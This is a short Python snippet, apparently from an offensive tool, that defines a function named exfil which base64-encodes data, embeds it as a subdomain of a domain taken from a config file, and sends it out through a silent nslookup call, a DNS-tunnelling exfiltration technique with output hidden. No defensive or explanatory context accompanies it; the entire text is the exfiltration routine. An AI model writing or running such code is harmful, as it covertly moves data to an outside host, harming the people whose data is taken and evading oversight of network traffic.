import subprocess, base64
import json
with open("config.json") as f:
    CONFIG = json.load(f)

def exfil(data):
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    domain = f"{encoded[:50]}.{CONFIG['dns_domain']}"
    subprocess.run(["nslookup", domain], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)